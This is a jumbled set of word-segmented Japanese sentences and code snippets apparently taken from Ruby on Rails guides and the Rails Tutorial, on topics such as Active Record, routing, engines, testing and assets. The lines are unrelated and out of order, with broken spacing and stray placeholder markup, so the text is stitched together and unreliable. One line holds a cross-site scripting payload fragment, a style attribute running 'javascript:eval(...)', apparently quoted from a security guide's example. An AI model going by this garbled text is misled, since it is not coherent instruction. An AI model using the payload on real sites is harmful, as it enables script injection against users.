master
ここ が 重要 で す ▟ アプリケーション は   * * いかなる 場合 も * *   エンジン より も 優先 さ れ ま す 。
フィード アイテム パーシャル に 削除 リンク を 追加 する 。
この 演習 は 不 必要 に 複雑 で 、 もし 各 テスト の 直前 に 共通 の セットアップ 用 タスク が あ れ ば 、 たしか に 不要 な 負荷 が かか る こと で しょ う 。
デフォルト で は 、 ` config▖ logger ` と 同じ 設定 が 使用 さ れ ま す 。
WARNING :   画像 ファイル の 拡張 子 は 省略 でき ま せ ん 。
#  < hash>
皆 さん が 拡張 を 始め る に あた り 、 ささやか ながら 私 から 2 つ ほど 一般 的 な アドバイス を し て み た い と 思 い ま す 。
これ は ユーザー に 対 し て \ kode { admin ? } メソッド   ( 論理 値 を 返 す )   が 使用 でき る 必要 が あ る こと を   ( RSpec の 論理 値 慣習 に 基 い て )   示 し て い ま す 。
この 強力 な 技法 が 、 Ajax と 呼 ば れ て い る もの で す 。
` truncate ` メソッド は 、 指定 さ れ た ` length ` に まで 長 さ を 切り詰め た レシーバ の コピー を 返 し ま す 。
次 に 、 \ kode {id } = \kode { 3 } の ユーザー が まだ データベース に 存在 する か どう か を 確認 し て み ま しょ う 。
\ kode {user ▖ save } を 実行 し た こと で ユーザー が 更新 でき ま し た ▟ \ ref{ sec : creating _user_objects } で 約束 し た よう に 、 マジック カラム の 更新 日時 も 更新 さ れ て い ま す 。
この ディレクティブ は 、 ` require_ self ` 呼び出し が 行 わ れ た その 場所 に CSS ファイル が あ れ ば 読み込 み ま す 。
外部 キー が 自分 の クラス で は な く 相手 の クラス に あ る の で あ れ ば 、 ` belongs_to ` で は な く ` has _one ` を 使用 する 必要 が あ り ま す 。
この とき コール バック は 実行 さ れ ま せ ん 。
配列 は 、 上記 コード の 最初 の 行 の \ kode {length } メソッド 以外 に も 、 さまざま な メソッド に 応答 し ま す 。
   def  set_author
    has_many  : articles
3 ▖ ▖ 9 )    # => false
\ kode {gem } コマンド で 特定 の バージョン 番号 を 指定 し な い 限り 、 Bundler は 自動 的 に 最新 バージョン の gem を 取得 し て インストール し ま す 。
NOTE :   ここ に 記述 する の は   " ホスト 名 "   ( サブ ドメイン と ルート ドメイン を 合わせ た もの )   のみ で す ▟ ` http://` や `https://` など の プロトコル スキーム を 記述 する 必要 は あ り ま せ ん 。
\ kode {empty ? } メソッド の 末尾 に あ る 疑問 符 に ご 注目 くださ い 。
\ kode { db : seed } で Rake タスク を 実行 し 終わ る と 、 サンプル アプリケーション の ユーザー が 100 人 に な っ て い ま す 。
\ ref{ sec : signup_error _messages } で は 、 ユーザー 登録 の エラー メッセージ 表示 に User モデル の エラー メッセージ を うま く 利用 し た こと を 思い出 し ま しょ う 。
HTML テンプレート に データ を 挿入 する 方法 は 、 きわめて 慎重 に 設計 する 必要 が あ り ま す 。
   if  boolean ?
    #  実行 後 に 行な う 作業
####  check _ box_ tag
Heroku へ の デプロイ が 完了 し た ら 、 自分 が 管理 し て い る メール アドレス を 使用 し て 、 production 環境 の サンプル アプリケーション で ユーザー 登録 を 行 っ て み ま しょ う 。
作成 する ドキュメント 自身 が Rails の ベスト プラクティス の よ い モデル と な る よう に 、 そして Rails の 最新 かつ 模範 的 な 使用 法 に な る よう に 書 く こと 。
デフォルト は 以下 の とおり で す 。
結合 モデル ( join   model ) の コレクション は 、 API 経由 で 管理 でき ま す ▟ たとえば 、 以下 の よう な 割り当て を 実行 し た と し ま す 。
従 っ て 、 新し い セッション フォーム を 作成 する とき に は 、 \ kode { form\_ for } ヘルパー に 追加 の 情報 を 独自 に 渡 さ な けれ ば な り ま せ ん 。
簡単 に 言 う と 、 まず 以下 の コマンド で データベース の マイ グレーション を 変更 でき ま す 。
SQL は 大 文字 小 文字 を 区別 し ま せ ん が 、 慣習 的 に SQL の キー ワード   (  \kode { DESC } など )   は 大 文字 で 書 く こと に な っ て い ま す 。
` config/initializers/inflections ▖rb ` に あ る ビルト イン の ルール は 拡張 可能 で す 。
name :  " David " )
以下 は 、 Active   Record に よ っ て 提供 さ れ る さまざま な データ アクセス メソッド の ほんの 一 例 で す 。
advance
self を 省略 し た 結果 を リスト \ ref{ code :micropost _create_image_upload } に 示 し ま す 。
self を 省略 し た 結果 を リスト \ ref{ code : users_controller_test _ login_route } に 示 し ま す 。
Sass と Asset   Pipeline は 、 ( 開発 効率 の ため に 切り分け られ た )   CSS の 冗長 な 部分 を 圧縮 し 、 本番 環境 に 最適 化 し た 結果 を 出力 する
Rails の デフォルト の ` has_and _belongs_to_many ` 関連 付け は 、 ほとんど の 場合 カスタマイズ 不要 で す が 、 時 に は 関連 付け の 動作 を カスタマイズ し た く な る こと も あ る と 思 い ま す 。
$  git   checkout   - b test ing _ branch
get  '/ patients/: id ' , to :  ' patients # show '
わか り やす く する ため に 、 この タグ に よ っ て 生成 さ れ る HTML を 以下 に 示 し ま す
はじめて の Ajax
たとえば 、 ` ActionView: : Helpers: : FormHelper ` で は 以下 の よう に 定義 さ れ て い ま す 。
client  =  Client ▖ last
( 振る舞い を 検証 する 統合 テスト は \ ref{ sec : following _ tests } で 実装 し ま す ▟ )
この 節 で は 、 以後 この フロー の 実現 に 専念 し ま す 。
<%=   form _ for ( [@ article ,  @ article ▖ comments▖build ] )   do  | f| %>
  example _user で 使用 する コード
`blog ` ディレクトリ の 下 に は 多数 の ファイル や フォルダ が 生成 さ れ て お り 、 これ ら が Rails アプリケーション を 構成 し て い ま す 。
ポリ モー フィック な ` belongs_to ` は 、 他 の あらゆる モデル から 使用 でき る 、 ( デザイン パターン で 言 う ところ の ) インターフェイス を 設定 する 宣言 と みな す こと も でき ま す 。
\ kode { default\_scope } を 使 う と デフォルト の 順序 を 変更 でき る
本番 環境 で 動作 する ステータス フィード
置き換え た 結果 を { 0 } { 1 } リスト 4 ▖ 3 { / 1 } { / 0 } に 示 し ま す 。
アセット を ローカル で プリ コンパイル する 理由 は いく つ か 考え られ ま す 。
* =  require   chrome
この 行 の 意味 に つ い て は 、 \ ref{ sec :user_micropost _associations } で 説明 し ま す 。
Cache - Control :   public ,   max - age=2592000
d   -   3 ▖ hours
` clear ` メソッド は 、 `errors ` コレクション に 含 ま れ る メッセージ を すべて クリア し た い 場合 に 使用 でき ま す 。
config ▖ assets▖css_ compressor   =   Transformer▖ new
( {p 0 } で { 2 } co{ / 2 } エイリアス を 設定 し た 場合 は 、 { 2 } git  co  - b   modify - README { / 2 } と 入力 する こと も でき ま す ) 。
\ kode { following } メソッド で 配列 の よう に 扱え る だけ で も 便利 で す が 、 Rails は 単純 な 配列 で は な く 、 もっと 賢 く この 集合 を 扱 っ て い ま す 。
指定 さ れ た 属性 で エラー が 発生 し な かっ た 場合 は 、 空 の 配列 が 返 さ れ ま す 。
*  `set_clear_dependencies_hook `: `active_ record▖ set_dispatch_hooks ` へ の フック を 提供 し ま す ▟ この イニシャライザ より 前 に 実行 さ れ ま す 。
さしあた っ て 、 コメント テキスト を 出力 する 役目 を この パーシャル に 担 っ て もら わ な けれ ば な り ま せ ん 。
te}╼╼    %  subsection  a_working _ log _ in_method   ( end ) ╼╼╼\ subsection { 現在 の ユーザー } %  ( fold) ╼\ label{ sec : current_user} ╼╼
    <%=  image_tag   attachments [ 'image▖ jpg '] ▖url,   alt :  'My   Photo ' ,   class :  'photos' %>
self を 省略 し た 結果 を リスト \ ref{ code : proto_status _feed } に 示 し ま す 。
concern を 利用 する と 、 同じ よう な ルーティング を 繰り返 し 記述 せ ず に 済 み 、 複数 の ルーティング 間 で 同じ 動作 を 共有 でき ま す 。
デフォルト は true で す 。
$  git  pull -- rebase
*   private や protected の 後 の 行 は インデント する 。
続 い て 、 リスト { p 0 } の 内容 を { 2 } README ▖ md { / 2 } に 入力 し ま す 。
#  try メソッド を 使用 し な い 場合
代り に データ 属性 を 使用 し て くださ い   ( 例 ： ` data: {  confirm :  'Are   you   sure ? ' }` ) 。
本 ガイド で は 、 最初 に この エンジン を 単体 で 動作 する よう に し 、 後 に この エンジン を アプリケーション に フック し ま す 。
#   Ruby   on   Rails   チュートリアル ： サンプル アプリケーション
d ▖ next _ week(:saturday )    # =>  Sat ,   15   May  2010
新し い コントローラ の 作成 は { 0 } 第 { 1 } 2 { / 1 } 章 { / 0 } で 行 い ま す 。
` : id ` は 、 ここ に ` : id ` パラメータ が 置 か れ る こと を 指定 する ため の 特殊 な 文法 で す ▟ この 場合 は 記事 の id を 表 し ま す 。
この とき 、 可能 な 限り \ kode {self }  ( user 自身 を 表 す オブジェクト )   を 省略 し て い る 点 に 注目 し て くださ い 。
####   その 他 の 時間 計算
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/ hash/ deep _merge▖ rb ` で す 。
       Prefix   Verb     URI   Pattern                   Controller # Action
-   [ NGINX ] ( http://wiki ▖nginx▖ org / XSendfile )
これ ら の バリデーション は 、 ` valid ? ` を 呼び出 す たび に 実行 さ れ ま す 。
    resources  : magazines   do
これ で 、 すべて の テスト が { 0 } { 1 } { / 1 } { 1 } { 2 } 成功 { / 2 } { / 1 } { 1 } { / 1 } { / 0 } する はず で す 。
                                order _number :   " A 12345 " )
データベース の 観点 で は 、 この 関連 付け に お い て は 相手 の クラス が 外部 キー を 持 ち ま す ▟ この 外部 キー は 相手 の クラス の インスタンス を 参照 し ま す 。
たとえば この 節 で は 、 ユーザー が データベース に 保存 さ れ る 前 に name と email フィールド の 両方 が 存在 する こと を 保証 し ま す 。
これ は 、 指定 さ れ た アセット へ の パス を 記述 し ま す 。
2 つ 目 の ケース で は 、 ルーティング で 正し く 処理 さ れ る よう に \ kode {user } と い う ハッシュ も 渡 し て い ま す 。
#  set to  <tt > : create</tt > if <tt > new_ record ?
最終 的 に は 次 の よう な HTML は にな り ま す 。
リスト \ ref{ code : real_account_activation_test } の テスト コード で は 、 フィクスチャ ユーザー に 有効 化 トークン を 追加 し て い る 点 に ご 注目 くださ い ▟ 追加 し な い 場合 は 空白 に な り ま す 。
フィード の HTML を テスト する   GREEN { 2 } { 3 } { / 3 } { 3 } { 4 } { / 4 } { / 3 } { 3 } { / 3}{ / 2 }
最初 は 編集 失敗 時 の 簡単 な テスト を 追加 し ま す   ( リスト \ ref{ code :unsuccessful_edit_test } ) 。
# => <fieldset ><p >< input   id= " name "   name =" name " type =" text "  /></p ></fieldset>
       create      app/assets/stylesheets/static _ pages▖css ▖ scss
------------------------
URL   / users / 1   の ルーティング は 有効 だ が ページ が な い 状態
$  rails   new blog
<%=  field_set_tag   do  %>
この 追加 の 節 は 、 \ href { http://screencasts▖railstutorial ▖org / }{ Ruby   on   Rails チュートリアル スクリーン キャスト シリーズ }   ( 原著 者 の 主催 する 有料 スクリーン キャスト :   英語 のみ )   で 使用 する テスト 用 設定 に つ い て 解説 し ま す 。
production 環境 の Rails で SendGrid を 使用 する 設定
これ は リスト \ ref{ code :about_view } で 使用 さ れ て い ま し た 。
理解 が 困難
この フォーム は ` POST ` リクエスト を `/articles/: article _ id / comments ` に 送信 し ま す ▟ これ に 対応 する の は ` Blorgh : : Comments Controller ` の ` create ` アクション で す 。
これ に よ り 、 リモート 環境 に バックアップ を 置 く こと が でき 、 本番 環境 で 発生 する エラー を なるべく 早期 に 発見 する こと が でき ま す 。
####  HTML / Java Script インジェクション
{ 0 } 表 2 ▖ 1 :   {/ 0 } { 1 } Users リソース に おけ る 、 ページ と URL の 関係 { / 1 } 。
上 の よう に 変更 する こと で 、 Active   Record は customer オブジェクト の コピー を 1 つ だけ 読み込 む よう に な り 、 不 整合 を 防 ぐ と 同時 に アプリケーション の 効率 も 高ま り ま す 。
リスト \ ref{ code : follow_unfollow _ following } の コード を 追加 する こと で 、 テスト スイート は   \ passing   に な る はず で す 。
具体 的 に は 、 \ kode {correct\ _user } フィルター 内 で \ kode {find } メソッド を 呼び出 す こと で 、 カレント ユーザー が 削除 対象 の マイクロ ポスト を 保有 し て い る か どう か を 確認 し ま す 。
すべて の ユーザー が フィード を 持 つ の で 、 \ kode {feed } メソッド は User モデル に 作 る の が 自然 で す 。
問題 と な っ て い る の は 、 デフォルト   ( Rails   3 ▖ 2 ▖ 3 の 場合 )   で Micropost モデル の \emph { すべて } の 属性 が アクセス 可能 に な っ て い る こと で す 。
この 種 の オブジェクト の 構文 は 、 \emph { Proc}   ( 手続き :   procedure )   と か \emph { ラムダ   ( lambda ) } と 呼 ば れ 、 \ kode {->} と い う 矢印 で 表 さ れ ま す 。
User ページ 用 の 最初 の テスト   ( { 2 } { 3 } { / 3 } { 3 } { 4} green { / 4 } { / 3 } { 3 } { / 3}{ / 2 } )
Action   View を Rails で 使用 する
レイアウト の 指定 に シンボル を 使用 する こと で 、 リクエスト が 実際 に 処理 さ れ る とき まで レイアウト を 確定 せ ず 、 選択 を 遅延 する こと が でき ま す 。
production 環境 から メール 送信 する ため に 、 「 SendGrid 」 と い う Heroku アド オン を 使用 し て アカウント を 検証 し ま す
###  エンジン を マウント する
   validates : password ,   confirmation :  true ,
他 の 解決 策 と し て CSS で \emph { 表示 } サイズ を 調整 する 方法 も あ り ま す が 、 これ だ と ファイル サイズ が 変わ り ま せ ん 。
Help ページ の HTML を 修正 する
//= require   bootstrap
この ファイル は エンジン の コントローラ 共通 の 機能 を 提供 する ため の もの で す 。
   def  update_name
m ▖ reachable ?  
###  ルーティング グロブ と ワイルド カード セグメント
Client ▖ order (:orders_count ,   created_at:  : desc)
Active   Record は 、 データベース に 恒久 的 に 保存 さ れ る 必要 の あ る ビジネス オブジェクト の 作成 と 利用 を 円滑 に 行なえ る よう に し ま す 。
マイクロ ポスト の データ モデル
Rails で こう い っ た 情報 を 表示 する ため に は 、 \emph {flash } と い う 特殊 な 変数 を 使 い ま す ▟ この 変数 は ハッシュ の よう に 扱 い ま す 。
第 \ ref { cha :filling _ in_the_layout } 章 で は 、 この 章 で 学 ん だ 内容 を サンプル アプリケーション の 開発 に 活か し て い き ま す 。
13 ▖ to_s(:rounded ,  precision :   5 )               # = >   13 ▖ 00000
この ヘルパー は 、 2 つ の テキスト フィールド が 完全 に 一致 する 内容 を 受け取 る 必要 が あ る 場合 に 使用 し ま す 。
ただし 、 この オプション は ` as :  : value ` オプション と 併用 でき ま せ ん 。
<%=   javascript_ include_tag   " application "  %>
#    updated_at  : datetime
    @ articles  =   Article▖ all
この あたり で 、 Active   Record で ユーザー オブジェクト を 検索 する 方法 を 学 ん で み ま しょ う 。
[ コンテンツ タイプ を 読み込 む 元 の サイト を 制御 する ため の 強力 な メカニズム ] ( http://w3c ▖ github▖io /webappsec/specs/content- security - policy /csp - specification ▖ dev▖html ) で す 。
   current_user▖ increment !  : visits
ユーザー と 関連 付け さ れ た マイクロ ポスト の fixture
*  ` ENV [ " RAILS _ ENV " ] ` は 、 Rails が 実行 さ れ る 環境   ( production 、 development 、 test など )   を 定義 し ま す 。
メール で URL が 必要 な 場合 は `*_url` ヘルパー を 使用 し て くださ い 。
置き換え た 結果 を { 0 } { 1 } リスト 4 ▖ 3 { / 1 } { / 0 } に 示 し ま す 。
この 例 で は Ruby   1 ▖ 9 ▖ 3 以上 の バージョン を 前提 と し て い ま す 。
最新 の RVM を 使用 する よう に し て くださ い ) 。
     create_table  : assemblies  do  | t |
しかし 、 実際 に 不明 な 定数 が 原因 で ` articles _helper▖ rb ` が ` NameError ` エラー を 発生 する と い う 場合 が 考え られ ま す 。
#### ` to_sentence `
" hello  world "
これ ら を 合わせ る と 、 次 の フォーム の 要素 を 探しだ し て テスト が 行 わ れ ま す 。
この コード は リスト \ ref{ code :hello_ action _redux _ 2 } で 使用 さ れ て い ま し た ▟ もう ひと つ 、
TIP: _`namespace ` ブロック の 内部 で 異な る コントローラ 名前 空間 を 使用 し た い の で あ れ ば 、 「 ` get  '/ foo' => '/ foo# index'` 」 の よう な 絶対 コントローラ パス を 指定 する こと も でき ま す ▟_
JRuby 環境 で Postgre SQL を 採用 する 場合 、 ` config/ database▖yml ` の 記述 方法 は 少し 異な り ま す 。
ポリ モー フィック 関連 付け の 詳細 に つ い て は [ この ガイド の 説明 ] ( # ポリ モー フィック 関連 付け ) を 参照 し て くださ い 。
この プロセス は 苦痛 で 、 バグ も 発生 し がち で す 。
#### ` assert_valid _keys`
NOTE :   Ruby の メソッド は ` public ` 、 `private` 、 ` protected ` に 分け られ ま す が 、 コントローラ の アクション に なれ る の は ` public ` メソッド だけ で す 。
Linux を 実行 し て い る 場合 は 、 この 時点 で 、 他 に も いく つ か の パッケージ を インストール する 必要 が 生じ る 場合 が あ り ま す 。
この テーブル は モデル を 表 さ な い の で 、 ` create_table ` に ` id :  false ` を 渡 し ま す 。
利用 可能 な 最新 の アダプタ の リスト に つ い て は 、 API ドキュメント の [ ActiveJob : :QueueAdapters ] ( http://api▖ rubyonrails ▖org / classes /ActiveJob /QueueAdapters▖html )   を 参照 し て くださ い 。
( 本 チュートリアル で は 常 に \ kode {- m } フラグ を 使用 する よう に し て い ま す ) 。
前者 の 問題 を \ ref{ sec : signup_error _messages } で 、 後者 の 問題 を \ ref{ sec : signup_success } で それぞれ 解決 し て い き ま す 。
デフォルト で は 、 関連 付け に よ っ て 探索 さ れ る オブジェクト は 、 現在 の モジュール の スコープ 内 の もの だけ で す 。
\ kode { form _ for } の 代わり に \ kode { form_tag } を 使用 し て 、 サイン インフォーム を リファクタリング し て くださ い 。
   inflect ▖irregular  'tooth ' ,  'teeth'
これ は リスト \ ref{ code :activation_token_test } で 使用 さ れ て い ま し た 。
従 っ て 、
テスト スイート が 以前 と 同様 に パス する こと も 確認 し て くださ い 。
多数 の レコード に 対 し て 反復 処理 を 行 い た い こと が あ り ま す ▟ たとえば 、 多く の ユーザー に ニュースレター を 送信 し た い 、 データ を エクスポート し た い など で す 。
違い と い え ば 、 Active   Record の   _ 関連 付け   ( アソシエーション ) _  を 設定 する ため の ` belongs_to : article ` と い う 行 が あ る 点 で す 。
  ```
これ で テスト に パス する はず で す 。
self を 省略 し た 結果 を リスト \ ref{ code :branch_raise } に 示 し ま す 。
詳細 に つ い て は [ Erubis ドキュメント ] ( http://www ▖kuwata- lab▖ com/erubis /users - guide ▖ 0 6 ▖ html#topics - trimspaces ) を 参照 し て くださ い 。
この 時点 で 、 全て の テスト が   \ passing   に な る はず で す 。
  #  また は
### `redirect_to ` を 使用 する
静的 ページ の 端正 に な っ た テスト 。
デフォルト で サポート さ れ て い る 言語 は 、 CSS に 代わ る SASS 、 Java Script に 代わ る Coffee Script 、 CSS / Java Script に 代わ る ERB で す 。
   belongs_to : article
上 の コード で も タイトル 全体 と マッチ し ま す 。
###  関連 付け の スコープ 制御
" hello " ▖ from ( - 2 )  # => " lo "
style = " background :url ( ' javascript :eval ( document▖ all▖mycode ▖expr ) ') " >
       record ▖errors [ attribute ]  <<  (options [ : message ]  ||  " は 正し い メール アドレス で は あ り ま せ ん " )
リスト \ ref{ code :hello_ root _ route } の とき
beginning _ of_ year   ( at_beginning _ of_ year )
複数 の オブジェクト が 集ま っ た セット に 対 し て ` url_ for ` を 使用 する こと も でき ま す ▟ 複数 の オブジェクト を 渡 し て も 、 適切 な ルーティング が 自動 的 に 決定 さ れ ま す 。
これ は リスト \ ref{ code :micropost _ordering _ test } で 使用 さ れ て い ま し た 。
|   POST       | / geocoder      |  geocoders# create  |  geocoder を 作成 する                        |
  $ bun dle   exec   rake  - T  db
Rails コンポーネント を 構成 する
ここ まで で 、 記事 の 作成 、 表示 、 一覧 表示 が でき る よう に な り ま し た 。
#  Turbolinks makes  following   links in   your   web   application   faster ▖
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/array/wrap ▖rb ` で す 。
代わり に 、 特定 \ kode {user_ id } に 対 する マイクロ ポスト の 数 を データベース に 問い合わせ ま す 。
docrails は 定期 的 に master に マージ さ れ ま す の で 、 Ruby   on   Rails ドキュメント の 編集 を 効率 よ く 行え ま す 。
これ は i 18 n ( 国際 化 ) 用 の 翻訳 ファイル で 発生 する こと も あ り ま す 。
gem  'jquery - rails '
` : shallow_ prefix ` オプション を 使用 する と 、 指定 さ れ た パラメータ を   ( パス で は な く )   名前 付き ヘルパー 名 の 冒頭 に 追加 し ま す 。
( 上 で は 2 番 目 の 引数 \ kode {token } の 名前 を 変更 し て 、 メソッド が 一般 化 さ れ た こと を あえて 強調 し て い ま す ) 。
ここ で 、 記憶 トークン と し て 何 を 使用 する か を 決め る 必要 が あ り ま す 。
上 の パターン から 、 それ 以外 の ディレクトリ を 含 む \emph { すべて } の spec を 実行 する 以下 の 方法 も 容易 に 想像 が つ く と 思 い ま す 。
異な る 種類 の ロック を 使用 し た い 場合 、 ` lock ` メソッド に 生 の SQL を 渡 す こと も でき ま す 。
また 、 自分 を フォロー し て い る ユーザー と 、 自分 が フォロー し て い る ユーザー を 同時 に 表示 でき る よう に し ま す 。
debug ( my _ hash )
\ ref{ sec : logging _ in } で は 、 セッション を 操作 する ため に 必要 な コード を いく つ か 追加 し 、 ユーザー ログ イン を 完成 さ せ る 予定 で す 。
基本 タイトル を 含め た StaticPages コントローラ の テスト
      User Mailer ▖ weekly_ summary ( user ) ▖ deliver_now
$  rake   test
たとえば 、 上 の ルーティング は アプリケーション で 以下 の よう な パス と し て 認識 さ れ ま す 。
この レイアウト ファイル を 有効 に する に は 、 デフォルト の タイトル 部分 を 以下 の 埋め込 み Ruby の コード に 差し替え ま す 。
したが っ て 、 今回 の 用途 で は \emph { ハッシュ 化 さ れ た パスワード } と \emph { 暗号 化 さ れ た パスワード } は 類義 語 と な り ま す 。
    has_many : comments
すべて の ページ に 適用 さ れ る 共通 の スタイル を CSS に 追加 する
Rails は 、 これ まで 実行 さ れ て い な い マイグレーション だけ を 適切 に 見分け て 実行 し ま す の で 、 以下 の よう な メッセージ だけ が 表示 さ れ る はず で す 。
   " FalseClass "  => " boolean " ,
Scaffold 機能 で コード を 自動 生成 する と 、 Web の あらゆる 部分 から モデル データ に アクセス し て やりとり でき る よう に な る 。
# => #< Person   id :  nil ,   name : nil >
    redirect_to @ article
ユーザー 登録 後 の ログ イン の テスト  
<% =  ren der   partial : @products ,  spacer_template :  " product_ruler "  %>
index ビュー が 起動 し 、 ERB   ( Embedded  RuBy :   ビュー の HTML に 埋め込 ま れ て い る Ruby コード )   を 実行 し て   HTML を 生成   ( レンダリング )   する 。
上 の 例 で は 、 ` street ` で は な く ` address_street ` が 生成 さ れ ま す 。
   <option   value = " 3 " > Tobias < /option >
Cucumber で は フィーチャー と ステップ が 分離 さ れ て い る こと に よ り 、 抽象 度 の 高 い 記述 が 可能 で あ る と い う 効果 が あ り ま す 。
singleton で な い 数字 に も 、 複製 不 可能 な もの が あ り ま す 。
しかし 、 この スコープ で でき る 機能 は 、 クラス メソッド で でき る 機能 と 重複 し て い ま す 。
#  Use  the  existing   token ▖
これ に よ り 、 その サーバー の アセット に 対 する リクエスト 数 を 減ら す こと が でき 、 アセット を ローカル ブラウザ の キャッシュ や その 他 の 中間 キャッシュ で 代替 する よ い 機会 が 与え られ ま す 。
<%=   link_to   " Home" ,  main_app ▖ root _ path %>
create   app/jobs/guests_ cleanup_job▖rb
\ kode { logged \_ in\_user } メソッド を Application コントローラ に 移 す
self を 省略 し た 結果 を リスト \ ref{ code : action_tests_ admin } に 示 し ま す 。
技術 上 は 、 1 つ の ルーティング に 2 つ 以上 の ワイルド カード セグメント を 含め る こと は 可能 で す 。
再現 手順 など に あいまい な 点 が あ る なら 、 どこ が わか り にく い か を 指摘 し ま しょ う 。
読み取り 専用 を 指定 さ れ た オブジェクト に 対 する 変更 の 試み は すべて 失敗 し 、 ` ActiveRecord : : ReadOnlyRecord ` 例外 が 発生 し ま す 。
[ Sign  in ]   リンク の 非 表示
デフォルト の エラー メッセージ は  _ " must   be greater  than or  equal  to %{ count }"_  で す 。
$ bun dle   exec   rake   test
              PATCH   /articles/: id ( ▖: format )        articles #update
\ kode { users } テーブル に \ kode { password\_digest } カラム を 追加 する マイグレーション
グループ 化 し た 項目 の 合計 を ひと つ の クエリ で 得 る に は 、 `group ` の 次 に ` count ` を 呼び出 し ま す 。
開発 中 に \ href {https://en ▖wiktionary ▖org/wiki / SNAFU } { 袋小路 } に 迷い込 ん で しま っ た 場合 で も 、 これ ら の 機能 を 使 え ば 元 の 状態 を 復元 でき ま す 。
      invoke     scss
date▖ advance ( years :   1 ,   weeks :   2 )    # =>  Mon ,   20   Jun  2011
[ Upload  image ]   ボタン と 画像 付き マイクロ ポスト の モックアップ を 図 \ ref { fig : micropost _ image_mockup } に 示 し ま す
A  test   of   \kode {authenticated ? } 
` collection ▖find ` メソッド は 、 コレクション に 含 ま れ る オブジェクト を 検索 し ま す 。
##### ` association = ( associate ) `
client  =  Client ▖ last ( 3 )
class   Holiday  <  ActiveRecord : : Base
( 1 ▖ ▖ 100 ) ▖ sum  # = >  505 0
一人 の 顧客 は 、 多く の 注文 を 行な う こと が でき ま す 。
|                     |  431                | : request _header_fields_too_large  |
   with _options   dependent :  : destroy   do  | assoc|
この コード で は 、 Bootstrap の ドロップ ダウン メニュー に 関連 する CSS の id と クラス が 与え られ て い る こと に 注目 し て くださ い 。
\ kode { git  log } を 終了 する に は \ kode { q } キー を 押 し て くださ い 。
ログ インフォーム の コード   ( 再掲 )
NOTE :   マイグレーション で ` t ▖integer   : supplier_ id ` の よう に 「 小 文字 の モデル 名 _ id 」 と 書 く と 、 外部 キー を 明示 的 に 指定 でき ま す 。
`&&  return` で は な く ` and   return ` を 使用 し て くださ い ▟`&&  return` は Ruby 言語 の & & 演算 子 の 優先 順位 が 高 すぎ て この 文脈 で は 正常 に 動作 し ま せ ん 。
     resources  : quotes
create   app/controllers/blorgh/ comments_controller▖ rb
StaticPages コントローラ 内 の \ kode { home } アクション と \ kode {help } アクション で 使用 する ルーティング 。
ユーザー を 作成 する アクション
     Article▖ none  # =>  この 場合 [ ] また は nil を 返 し 、 呼び出 し 側 の コード を 中断 する
これ で すべて の テスト に パス する はず で す ▟ これ で 、 存在 性 の 検証 は 完成 し ま し た 。
\ kode { destroy ▖js▖erb } ファイル の 方 も 同様 で す   ( リスト \ ref{ code : destroy _ js_erb } ) 。
    mid dlewares  =  [ ]
# =>  Sun ,   16   Sep  2012   0 0 : 0 0 : 0 0   UTC   + 0 0 : 0 0 ▖ ▖
これ は リスト \ ref{ code :initial _failing _ signin_test } で 使用 さ れ て い ま し た 。
データ 構造 の 循環 検出
たとえば 、 production 環境 を ミラー コピー し た サーバー が あ る が 、 テスト 目的 で のみ 使用 し た い と い う 場合 を 想定 し て み ま しょ う 。
` delegate ` を 使用 すれ ば でき る よう に な り ま す 。
       create     spec/requests/static _ pages_spec ▖ rb
問題 が 生 じ た 場合 は 、 エラー メッセージ を Google で 検索 する か 、 \ href { http://railstutorial ▖org / help}{ Rails チュートリアル の Help ページ } を 参照 し て くださ い 。
典型 的 な base 64 の 文字 列 は 、 次 の よう な もの で す 。
新規 ユーザー 作成 ページ   ( \ href { http://local host : 3000 / users/new}{/ users/new})
#   This  file   is  copied to   spec/ when  you   run  'rails   generate rspec : install'
それ で は 、 リスト \ ref{ code :micropost _migration } を マイグレーション 使 っ て 、 いつ も の よう に データベース を 更新 し て み ま しょ う 。
メイラー アクション で 定義 し た インスタンス 変数 は 、 他 の アクション や ビュー と 同様 、 メイラー の ビュー から 参照 でき る 。
置き換え た 結果 を { 0 } { 1 } リスト 4 ▖ 3 { / 1 } { / 0 } に 示 し ま す 。
たとえば 、 プログラム の ライフ サイクル が 続 く 間 、 整数 の 1 は 常 に 同じ インスタンス を 参照 し ま す 。
テスト 手順 は しんぷる で す 。
customer
          subject :   " 添付 の 利用 規約 を 参照 し て くださ い " ,  
ここ で の アクセス 制御 の ポイント は 単純 で す ▟ \ kode { create } アクション と \ kode { destory } アクション は 、 いずれ も ユーザ が サイン イン し て い な けれ ば 実行 でき な い もの と し ま す 。
{ 0 } 図 8 ▖ 6 { / 0 } { 1 } サイン イン に 失敗 し た とき の フラッシュ メッセージ ▟ \ href { http://railstutorial ▖org / images/figures/failed_ signin_flash_bootstrap - full ▖ png } { ( 拡大 ) } { / 1 }
Rails が この レイアウト を 処理 し 、 埋め込 み Ruby を 評価 する と 、 上 の リスト は 以下 に 置き換わ り ま す 。
Rails アプリケーション を 新規 作成 し た ら 、 次 は \emph {Bundler } を 実行 し て 、 アプリケーション に 必要 な gem を インストール および インク ルード し ま す 。
続 い て 、 ログ イン の 統合 テスト を 含 む 全 テスト スイート を 実行 し て み る と 、  \ passing   に な る こと を 確認 でき ま す 。
  end
末尾 の   " _ id "   の アンダース コア が 不要 な 場合 は 引数 に ` false ` を 指定 し ま す 。
TIP:   パーシャル に つ い て の 詳細 は 本 ガイド の [ レイアウト と レンダリング ] ( layouts_and _ren dering ▖ html ) を 参照 し て くださ い 。
#   Validations   with   no <tt > : on</tt >  option   will   run  no
`Blorgh : : Article ` モデル の ` set_author ` メソッド は 以下 の クラス も 使用 する 必要 が あ り ま す 。
< aside >
( 6   rows )
本章 から 、 本格 的 な サンプル アプリケーション の 開発 を 進め て い き ま す ▟ 残り の チュートリアル で は 、 この アプリケーション を 例題 と し て 扱 っ て 学習 し て い く こと に な り ま す 。
before_filter に \ kode { signed_ in_user } を 追加 する 。
Ruby の { 0 } モジュール { / 0 } と い う 機能 を 使用 する と 、 そう し た 関数 を 一 箇所 に パッケージ 化 でき る こと を { p 1 } で 学 び ま し た 。
\ kode {find_ by _email } は 、 \ kode { users } テーブル の \ kode {email } 属性 に 基づ い て Active   Record が 自動 的 に 生成 する メソッド で す
なお 、 ` include ? ` など を 使用 し て 一意 性 を チェック する と 競合 が 発生 し やす い の で 注意 が 必要 で す 。
|                     |  30 7                | :temporary _ redirect               |
: \ footnote {
この オブジェクト を データベース に 保存 し た い 場合 は 、 単に ` save ` を 呼び出 し ま す 。
#### ` has _one ` の オプション
